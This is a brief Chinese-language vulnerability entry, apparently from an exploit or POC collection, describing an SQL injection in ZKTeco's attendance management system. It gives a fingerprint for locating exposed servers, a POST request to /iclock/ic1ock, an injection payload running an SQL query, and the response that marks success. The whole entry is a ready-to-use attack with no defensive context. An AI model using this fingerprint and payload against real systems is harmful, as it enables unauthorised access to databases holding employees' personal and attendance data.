# ZKTeco考勤管理系统ic1ock存在SQL注入漏洞

ZKTeco ｜ SQL注入 ｜ —
- **指纹**：`body="/media/images/ZKECO16.ico"`
- **请求**：`POST /iclock/ic1ock HTTP/1.1`

**Payload**
```
submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select user()
```
- **响应特征**：200